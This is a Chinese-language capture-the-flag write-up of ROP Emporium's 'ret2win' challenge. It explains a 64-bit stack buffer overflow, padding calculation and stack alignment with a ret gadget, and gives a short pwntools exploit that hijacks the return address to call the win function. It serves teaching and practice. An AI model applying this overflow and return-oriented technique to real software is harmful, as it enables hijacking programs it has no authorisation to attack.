# ret2win

> ROP Emporium 第 1 题 | x86-64 Linux | 知识点: 基础栈溢出 + x64 栈对齐

## 题目简介

32 字节 buffer 被 `read` 读入最多 56 字节,栈溢出 24 字节足以覆盖 saved RIP。程序里已经存在一个 `ret2win()` 函数,只要让 RIP 跳过去就会打开 `flag.txt` 并输出 flag。

## 核心知识点

- ELF 64-bit 二进制基本结构
- 栈布局: buffer → saved RBP → saved RIP(返回地址)
- 栈溢出原理: 数组写越界,覆盖到 saved RIP 后劫持控制流
- padding 计算: Ghidra `acStack_28[32]` → padding = `0x28 = 40` 字节
- 小端序 + `p64()` 打包地址
- **x86-64 栈对齐**: ABI 要求 `movaps` 指令操作的地址必须 16 字节对齐,所以函数入口 RSP 末位必须 = 8(`push rbp` 后变 0)。ROP 链直接 ret 进入目标函数会让 RSP 末位 = 0 错位,导致 system / printf 等函数内部 movaps 崩溃

## 二进制侦察

```bash
file ./ret2win
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

checksec --file=ret2win
# NX enabled, no PIE, no canary, partial RELRO
```

## 漏洞分析

`pwnme` 反编译关键代码:

```c
void pwnme(void) {
    char buffer[32];
    memset(buffer, 0, 32);
    read(0, buffer, 56);    // 读 56 字节进 32 字节 buffer
    puts("Thank you!");
}
```

读 56 - 32 = 24 字节溢出,覆盖 8 字节 saved RBP + 8 字节 saved RIP + 8 字节起始的 ROP 链。

## 攻击思路

### 栈布局(高地址在上)

```
高地址 ↑
        | saved RIP    | <- 用 ret_gadget 地址覆盖
        | saved RBP    | <- 用 'A' * 8 填
        | buffer[31:0] | <- 用 'A' * 32 填
低地址 ↓
```

### ROP 链

```
1. pwnme 末尾 ret  → 跳到 ret_gadget (栈对齐补偿)
2. ret_gadget      → 跳到 ret2win (此时 RSP 末位 = 8, 对齐)
3. ret2win 内部    → 打开 flag.txt + puts 输出
```

为什么需要 ret_gadget? 直接 `ret → ret2win` 会让 RSP 末位 = 0,ret2win 内部调用 `system` 时 movaps 崩溃。多跳一次纯 ret 让 RSP 末位变成 8,对齐。

## exploit

完整代码见 [exploit.py](./exploit.py)。

```python
from pwn import *

elf = context.binary = ELF('./ret2win')
io = process('./ret2win')

ret_gadget   = 0x40053e             # 纯 ret 指令
ret2win_addr = elf.sym['ret2win']

payload = b'A' * 40 + p64(ret_gadget) + p64(ret2win_addr)
io.sendline(payload)
io.interactive()
```

## 关键细节

- **padding 必须用 cyclic 或反编译验证**: Ghidra 的 `acStack_XX[N]` 中 XX 是 buffer 起始**距离 saved RIP** 的偏移,padding 直接 = `0xXX` (不要再 +8)
- **栈对齐的实战感**: 如果你的 exploit 在调用 system / printf / fopen 时崩溃,90% 是对齐错。补一个纯 ret gadget 测试

## Flag

```
ROPE{a_placeholder_32byte_flag!}
```

(ROP Emporium 全是占位 flag,实战意义在于过程而非 flag 内容)

## 参考

- ROP Emporium: <https://ropemporium.com/challenge/ret2win.html>
